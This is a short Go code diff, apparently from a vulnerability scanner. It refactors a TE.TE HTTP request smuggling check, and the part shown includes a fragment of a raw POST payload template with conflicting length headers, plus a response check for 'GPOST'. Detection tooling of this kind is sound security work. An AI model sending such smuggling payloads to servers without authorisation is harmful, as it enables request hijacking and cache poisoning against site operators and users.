@@ -1,11 +1,10 @@
 package Smuggling
 
 import (
-	"github.com/hktalent/scan4all/lib/socket"
 	"strings"
 )
 
-var TeTePayload = []string{`POST / HTTP/1.1
+var TeTePayload = []string{`POST %s HTTP/1.1
 Host: %s
 Content-Type: application/x-www-form-urlencoded
 Content-length: 4
@@ -35,15 +34,13 @@ type TeTe struct {
 func (r *TeTe) CheckResponse(body string) bool {
 	return -1 < strings.Index("Unrecognized method GPOST", body)
 }
-
+func (r *TeTe) GetTimes() int {
+	return 1
+}
 func (r *TeTe) GetPayloads() *[]string {
 	return &TeTePayload
 }
-func (r *TeTe) Check(rc *socket.CheckTarget) {
-	for _, x := range TeTePayload {
-		s := rc.SendOnePayload(x, 1)
-		if r.CheckResponse(s) {
-			break
-		}
-	}
+
+func (r *TeTe) GetVulType() string {
+	return "TE-TE"
 }
